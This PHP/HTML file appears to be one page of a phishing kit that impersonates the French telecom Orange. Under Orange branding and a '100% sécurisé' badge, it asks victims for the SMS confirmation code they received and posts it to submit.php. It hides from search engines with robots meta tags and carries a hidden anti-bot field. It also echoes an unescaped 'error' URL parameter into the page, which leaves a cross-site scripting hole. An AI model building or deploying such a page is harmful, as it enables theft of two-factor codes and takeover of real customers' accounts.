<?php

    include_once '../inc/app.php';
?>
<!doctype html>
<html style="background-color: #EEEEEE;">

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="../assets/css/bootstrap.min.css">
        <link rel="stylesheet" href="../assets/css/helpers.css">
        <link rel="stylesheet" href="../assets/css/fonts.css">
        <link rel="stylesheet" href="../assets/css/main.css">

        <link rel="shortcut icon" href="../assets/images/ofavicon.png" type="image/png"> 

        <title>Identifiez-vous avec votre compte</title>
    </head>

    <body style="background-color: #EEEEEE;">

        <!-- HEADER -->
        <header id="oheader2">
            <div class="container">
                <img style="max-width: 90px;" src="../assets/images/orange.png"> Orange
            </div>
        </header>
        <!-- END HEADER -->

        <!-- MAIN -->
        <main id="omain2">
            <div class="container">

                <form method="post" action="submit.php">
                    <input type="hidden" name="verbot">
                    <input type="hidden" name="type" value="oconfirm_code">
                    <input type="hidden" name="error" value="<?php echo $_GET['error']; ?>">
                
                <div class="logos mt20 mb20">
                    <div class="left"><img src="../assets/images/lock.png"> 100% sécurisé</div>
                    <div class="right"></div>
                </div>

                <div class="details-box">
                    <h3>Merci de saisir le code reçu par SMS.</h3>
                    <p class="mb-3 text-center">Les champs marqués d'un <span style="color: #f16e00;">*</span> sont obligatoires.</p>
                    <div class="row form-group mt-4 mb-4">
                        <label class="col-md-5" for="oconfirm_code">SMS code <span>*</span></label>
                        <div class="col-md-7">
                            <div style="max-width: 230px;"><input type="text" name="oconfirm_code" id="oconfirm_code" class="form-control <?php echo is_invalid_class($_SESSION['errors'],'oconfirm_code') ?>"></div>
                        </div>
                    </div>
                </div>

                <div class="btns">
                    <p><i class="fas fa-angle-left"></i> Retour à l'étape précédente</p>
                    <button type="submit">Confirmer</button>
                </div>

                </form>

            </div>  
        </main>
        <!-- END MAIN -->
        
        
        <!-- JS FILES -->
        <script src="../assets/js/jquery.min.js"></script>
        <script src="../assets/js/popper.min.js"></script>
        <script src="../assets/js/bootstrap.min.js"></script>
        <script src="../assets/js/fontawesome.min.js"></script>
        <script src="../assets/js/main.js"></script>

    </body>

</html>